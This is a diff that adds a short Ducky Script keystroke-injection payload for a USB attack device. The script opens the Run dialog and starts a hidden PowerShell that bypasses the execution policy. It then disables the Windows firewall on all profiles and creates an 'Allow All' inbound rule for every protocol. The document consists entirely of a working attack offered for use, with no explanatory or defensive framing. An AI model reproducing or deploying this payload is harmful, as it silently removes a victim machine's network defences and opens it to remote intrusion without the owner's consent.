@@ -1,0 +1,12 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Firewall bypass
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+ENTER
+DELAY 500
+STRING New-NetFirewallRule -DisplayName "Allow All" -Direction Inbound -Action Allow -Protocol Any
+ENTER
